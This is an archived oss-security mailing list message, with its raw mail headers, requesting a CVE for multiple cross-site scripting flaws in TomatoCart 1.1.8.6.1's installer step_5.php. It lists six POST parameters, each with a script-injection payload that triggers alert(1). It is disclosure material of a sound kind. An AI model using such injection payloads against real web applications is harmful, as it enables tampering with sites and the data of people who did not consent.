X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1725" "Thursday" "24" "November" "2016" "15:25:10" "+0800" "haojun hou" "haojunhou@gmail.com" "<60EBD88B-40E8-47F9-B959-F8500C994D59@gmail.com>" "73" "[oss-security] CVE request - TomatoCart 1.1.8.6.1 Multiple Cross-Site Scripting (XSS)" nil nil nil "11" "2016112407:25:10" "[oss-security] CVE request - TomatoCart 1.1.8.6.1 Multiple Cross-Site Scripting (XSS)" (number mark "U       haojunhou@gm Nov 24   73/1725  " thread-indent "\"[oss-security] CVE request - TomatoCart 1.1.8.6.1 Multiple Cross-Site Scripting (XSS)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21535 invoked by uid 550); 24 Nov 2016 10:44:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13901 invoked from network); 24 Nov 2016 07:25:27 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=from:mime-version:subject:message-id:date:to;
        bh=tufEFEe7VkDvgvgOwr8N5ViT0kT58jf009XZA87h7Zs=;
        b=imYgZOalhoPLqZ2HSkKpo7R+t+tgVqHmHA8JvsEAa5zEHkJUb8ZIafslyl68gTcXSC
         3E1ODxNXJWqVp7uGO7A70aHxTJudWnlwrwVpXsp7Xvb8Im7+PUbsCDSYZwnafm3X1w4t
         ZXKJqIyxNx6Fm8RTmU1BRu5VDM9AP7x84sRI7QJO9F4ZLk1Xk2CrYAAr32QefAeUCqu+
         JuJtvgLcznv2DfU6oMK3CQxo/vw7hDa35NfvbIdFOMh12QaQF8tfGJhn5AkgdJMdlSLP
         iL/sYHqS/SNH/favlEzy6OpIP79RaITI2fm6NK9UiVls+HaR+sWoapOJXo4LNknal9fk
         whFw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:mime-version:subject:message-id:date:to;
        bh=tufEFEe7VkDvgvgOwr8N5ViT0kT58jf009XZA87h7Zs=;
        b=NcZAYbKyVGCHRIf8/BZLLO147BbjEfWf5buo1eqir14BfsunklaTFbnbOrwz/lzj2Q
         EyLToZXHHSxSZQ92YKpV1kwQlCVwH86bnbu2+rDpE2OMkO+0YpZCzT3jFdEWXS5Bty9Z
         0IuluCpoPyv56oi9WvqeYh4j8JBKkzvMigIJkMqTmAuMmTJz61pZMoMY8pNQqEaUOGgr
         LCFDmb2ymhY4lo1mdQCuDlEmdj3aEesPbdEkT8BtSj8xwRSyK62t1F39RTMYfWyIP0nc
         m0PmDUi7luze5z2kAI8bpsNgFIohTmCW0SjVmDCNGqZ5G5WpGwJcQE+lkvTbyQFVyh+A
         wuvQ==
X-Gm-Message-State: AKaTC00mhKi8WJCeLWmjG5JNujiUhC7VbMeqBl/+sKy8CuAx39ISrbHin9IOJpQynvp1kg==
X-Received: by 10.99.127.72 with SMTP id p8mr1713494pgn.183.1479972315539;
        Wed, 23 Nov 2016 23:25:15 -0800 (PST)
From: haojun hou <haojunhou@gmail.com>
Content-Type: multipart/alternative;
 boundary="Apple-Mail=_EB8402F7-78C3-4958-8D3A-D1E4C8EAA516"
Mime-Version: 1.0 (Mac OS X Mail 10.1 \(3251\))
Message-Id: <60EBD88B-40E8-47F9-B959-F8500C994D59@gmail.com>
Date: Thu, 24 Nov 2016 15:25:10 +0800
To: oss-security@lists.openwall.com
X-Mailer: Apple Mail (2.3251)
Subject: [oss-security] CVE request - TomatoCart 1.1.8.6.1 Multiple Cross-Site Scripting
 (XSS)

--Apple-Mail=_EB8402F7-78C3-4958-8D3A-D1E4C8EAA516
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;
	charset=gb2312

Hi:
TomatoCart 1.1.8.6.1 - Multiple Cross-Site Scripting (XSS)=20

Procuct: TomatoCart

Vendor: TomatoCart http://www.tomatocart.com

Vunlerable Version: 1.1.8.6.1 and probably prior

Tested Version: 1.1.8.6.1

Author: Haojun Hou in ADLab of Venustech

=20

Advisory Details:

Haojun Hou in ADLab of Venustech discovered Multiple Cross-Site Scripting (=
XSS) in TomatoCart 1.1.8.6.1, which can be exploited to add,modify or delet=
e information in application`s database and gain complete control over the =
application.

=20

The vulnerability exists due to insufficientfiltration of user-supplied dat=
a in multiple HTTP POST parameters passed to =A1=B0TomatoCart-v1-released-v=
1.1.8.6.1/install/templates/pages/step_5.php=A1=B1 url. An attacker could e=
xecute arbitrary HTML and script code in browser in context of the vulnerab=
le website.

The exploitation examples below uses the "alert()" JavaScript function to s=
ee a  pop-up messagebox:

(1)POST

DB_DATABASE=3D  <>"?>";</script><script>alert(1);</script><script>"<?php"

(2)POST

DB_SERVER_PASSWORD=3D "?>";</script><script>alert(1);</script><script>"<?ph=
p"

(3)POST

DB_TABLE_PREFIX=3D "?>";</script><script>alert(1);</script><script>"<?php"

(4)POST

DB_DATABASE_CLASS=3D "?>";</script><script>alert(1);</script><script>"<?php"

(5)POST

DB_SERVER_USERNAME=3D "?>";</script><script>alert(1);</script><script>"<?ph=
p"

(6)POST

DB_SERVER=3D "?>";</script><script>alert(1);</script><script>"<?php"

=20

Could you please help me assign a CVE for this issue?



=20=

--Apple-Mail=_EB8402F7-78C3-4958-8D3A-D1E4C8EAA516--
